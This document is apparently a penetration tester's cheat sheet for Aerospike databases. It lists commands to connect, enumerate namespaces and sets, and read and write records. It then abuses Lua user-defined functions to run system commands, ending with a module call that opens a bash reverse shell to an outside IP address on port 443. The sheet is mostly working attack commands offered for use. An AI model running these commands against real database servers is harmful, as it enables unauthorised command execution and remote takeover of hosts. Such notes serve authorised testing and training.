Aerospike  - keys and Data!!!
```sh
# Connect to Aerospike db with asadm
asadm -h 192.168.242.143
asadm -h 192.168.242.143 -p 3000
# Connect to Aerospike db with aql
aql -h 192.168.242.143
aql -h <host> -U <username> -P <password>
# General Enumeration
show namespaces
show sets
show bins
# SynTax
select * from test.myset
select * from <namespace>.<set> where <bin>="<value>"
SELECT * FROM <namespace>.<set> WHERE PK = <key_value>
# Indexes
show indexes [<namespace>]
drop index <ns> <index>create [indextype] INDEX <index-name> ON <namespace>.<set> (<bin>)
# Insert/Update | delete records
insert into <namespace>."<set>" (PK, <bin-1>, <bin-2>) values ("<key>", "<value-2>", "<value-3>")
delete from <namespace>.<set> WHERE PK=<key>

insert into test."myset" (PK, bin1, bin2) VALUES ('1', 'hacker', 123);
```

Aerospike Lua UDFs!!!
```sh
# Refister UDFs
REGISTER MODULE '<FILE_PATH>'
# List Registered Lua UDFs
show modules
# Read Module Content
set output raw
DESC MODULE poc.lua
# Run UDFs Functions
EXECUTE <module>.<function>(<args>) ON <ns>[.<set>]
EXECUTE <module>.<function>(<args>) ON <ns>[.<set>] WHERE PK = <key>

execute poc.runCMD('id') on test.myset where PK='1';
execute poc.runCMD("bash -c 'bash -i >& /dev/tcp/192.168.45.213/443 0>&1 &'") on test.myset where PK='1';
```
